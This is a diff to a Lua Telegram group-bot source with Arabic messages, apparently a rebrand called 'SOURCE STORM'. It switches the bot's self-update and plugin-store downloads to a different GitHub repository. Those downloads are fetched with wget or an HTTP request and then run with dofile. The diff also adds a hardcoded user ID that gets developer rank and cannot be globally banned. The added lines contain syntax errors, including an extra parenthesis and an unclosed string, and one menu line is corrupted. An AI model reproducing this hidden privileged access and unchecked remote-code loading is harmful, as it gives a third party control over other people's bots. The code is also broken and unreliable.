@@ -170,7 +170,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ffasit/photo/main/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -183,7 +183,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1962004752,1965534755,1966856869,1966692741}   
+sudo_users = {SUDO,1962004752,1965534755,1966856869,1966692741,1966692733}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -289,6 +289,8 @@ elseif tonumber(user_id) == tonumber(1966856869) then
 var = true
 elseif tonumber(user_id) == tonumber(1966692741) then
 var = true
+elseif tonumber(user_id) == tonumber((1966692733) then
+var = true
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -327,6 +329,8 @@ elseif tonumber(user_id) == tonumber(1966856869) then
 var = 'مـطـور السـورس' 
 elseif tonumber(user_id) == tonumber(1966692741) then
 var = 'مـرات بــودي'
+elseif tonumber(user_id) == tonumber(1966692733) then
+var = 'علي بابا الله'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -1309,7 +1313,7 @@ send(msg.chat_id_, msg.id_,'𖥳 لا يمكنك تغيير المطور الا�
 end
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/JAPWA/STORM/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' 𖥳 تم تحديث السورس ايها المبرمج الفاشل')
 dofile('DRAGON.lua')  
 end
@@ -2980,7 +2984,7 @@ end
 return false
 end
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/Ffasit/photo/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/JAPWA/STORM/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' 𖥳 تم تحديث السورس')
 dofile('DRAGON.lua')  
 end
@@ -3312,7 +3316,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𝑩𝑶𝑫𝒀',url="t.me/Xx_BoDa_UXB"},{text = '𝑨𝑯𝑴𝑬𝑯', url="t.me/A7maaaaaaaaaaaaaaa"}},
-{{text = '𝑴𝑨𝑹𝑰𝑨𝑴',url="t.me/M_e_r_oOoOo"}},
+{{text = '𝑴𝑨𝑹𝑰𝑨𝑴',url="t.me/M_e_r_oOoOo"},{text = 'علي بابا الله', url="t.me/A7maaaaaaaaaaaaaaa"}},
 {{text = '𝑺𝑶𝑼𝑹𝑪𝑬 𝑺𝑻𝑶𝑹𝑴',url="t.me/SOURCE_STORM"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 𖥳' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
@@ -3344,6 +3348,18 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '𝐃𝐄𝐕 𝐉𝐀𝐁𝐖𝐀',url="t.me/J_A_B_W_A"}},
+{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖥳' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/J_A_B_W_A&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+if text == 'علي بابا الله' or text == 'جابوا' or text == 'مين عملك السورس' or text == 'مبرمح السورس²' then
+local Text = [[
+اي حاجه
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'علي بابا الله',url="t.me/J_A_B_W_A"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 𖥳' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -5777,6 +5793,10 @@ if tonumber(result.sender_user_id_) == tonumber(1966692741) then
 send(msg.chat_id_, msg.id_, " 𖥳 لا تسطيع حظر مرات بودي عام")
 return false 
 end
+if tonumber(result.sender_user_id_) == tonumber(1966692733) then  
+send(msg.chat_id_, msg.id_, " 𖥳 لا تسطيع حظر مبرمج السورس عام)
+return false 
+end
 database:sadd(bot_id..'GBan:User', result.sender_user_id_)
 chat_kick(result.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
@@ -6224,7 +6244,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSoFi(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/Ffasit/photo/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/JAPWA/STORM/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -6262,7 +6282,7 @@ t = " 𖥳 الملف  ⇇"..file.."\n 𖥳 تم تعطيل ملف \n"
 else
 t = " 𖥳 بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/photo/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -6282,7 +6302,7 @@ t = " 𖥳 بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " 𖥳 الملف  ⇇"..file.."\n 𖥳 تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/photo/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/JAPWA/STORM/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -16746,7 +16766,7 @@ Msᴀɢ ~ #msgs
 .𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
-.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
+.𖣂 𝙢𝙨??𝙨 , #msgs  🖤 ↴
 .𖣂 𝗖𝗛 - ↝@SOURCE_STORM↜ 𖥳 
 ]],
 [[
